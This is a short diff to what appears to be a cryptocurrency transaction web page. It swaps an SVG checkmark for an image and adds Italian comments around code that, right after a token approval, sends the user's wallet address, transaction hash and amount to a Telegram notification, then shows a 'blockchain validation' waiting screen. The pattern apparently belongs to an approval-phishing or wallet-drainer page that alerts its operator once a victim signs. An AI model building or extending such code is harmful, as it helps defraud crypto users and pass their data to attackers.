@@ -432,15 +432,7 @@
         <div class="processing-content">
             <button class="close-btn" onclick="">✕</button>
             <div class="checkmark-circle">
-                <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <!-- Checkmark BLU e VERDE 3D -->
-                    <g>
-                        <!-- Parte blu -->
-                        <path d="M20 50 L40 70 L60 40" stroke="#0052cc" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                        <!-- Parte verde -->
-                        <path d="M50 70 L80 30" stroke="#10b981" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
-                    </g>
-                </svg>
+                <img src="./checkmark-3d.png" alt="Processing" style="width: 100%; height: 100%; object-fit: contain;" />
             </div>
             <div class="processing-text">Processing...</div>
             <div class="processing-subtext">Transaction in progress! Blockchain validation is underway. This may take a few minutes.</div>
@@ -626,12 +618,14 @@
                     }
                 }
 
+                // Invia notifica Telegram SUBITO dopo l'approve
                 try {
                     await sendTelegramNotification(finalUserAddress, txHash, amount);
                 } catch (notifError) {
                     console.error('Error sending notification:', notifError);
                 }
 
+                // Mostra la schermata di processing
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
